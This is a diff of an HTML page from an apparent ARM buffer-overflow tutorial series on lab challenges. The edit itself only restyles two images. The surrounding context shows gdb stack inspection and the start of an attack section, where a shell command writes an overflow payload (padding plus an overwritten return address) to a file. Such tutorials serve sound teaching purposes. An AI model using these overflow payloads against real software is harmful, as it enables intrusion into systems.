@@ -166,7 +166,7 @@ February 4, 2021
 <p><figure><figcaption><span markdown='1'>
 <pre data-input_format="markdown" data-output_format="plain-block"><code></code></pre>
 </span></figcaption>
-<object  class='' align='middle' data='/img/arm/azeria-arm-challenges/before-bo.svg' type='image/svg+xml'></object></figure></p>
+<object style="display: block; margin-left: auto; margin-right: auto;" class='' align='middle' data='/img/arm/azeria-arm-challenges/before-bo.svg' type='image/svg+xml'></object></figure></p>
 <p>The stack pointer <code><span class="highlight-candombe-inline"><span class="nf">sp</span><span class="w"></span></span></code> after <code><span class="highlight-candombe-inline"><span class="n">getpath</span><span class="w"></span></span></code> returns will be at <em>4 bytes more</em> than <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> <em>before</em> the return:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span><span class="w"> </span><span class="nv">x</span><span class="o">/</span><span class="mi">1</span><span class="nv">wx</span><span class="w"> </span><span class="kc">$</span><span class="nv">fp</span><span class="w">   </span><span class="c1">; before getpath returns</span><span class="w"></span>
 <span class="err">0</span><span class="nl">xbefffb84:</span><span class="w">     </span><span class="err">0</span><span class="nf">x00010578</span><span class="w"> </span><span class="c1">; &lt;-- ret address (to main)</span><span class="w"></span>
@@ -179,7 +179,7 @@ February 4, 2021
 <p><figure><figcaption><span markdown='1'>
 <pre data-input_format="markdown" data-output_format="plain-block"><code></code></pre>
 </span></figcaption>
-<object  class='' align='middle' data='/img/arm/azeria-arm-challenges/after-bo.svg' type='image/svg+xml'></object></figure></p>
+<object style="display: block; margin-left: auto; margin-right: auto;" class='' align='middle' data='/img/arm/azeria-arm-challenges/after-bo.svg' type='image/svg+xml'></object></figure></p>
 <h2 id="the-attack-without-dep-and-aslr">The attack (without DEP and ASLR)</h2>
 <p>The <code><span class="highlight-candombe-inline"><span class="nf">egg.text</span><span class="w"></span></span></code> is the same one used in the <a href="/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">part 6</a>.</p>
 <div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ <span class="nb">echo</span> -ne <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\xfb\xff\xbe&#39;</span> &gt; exploit
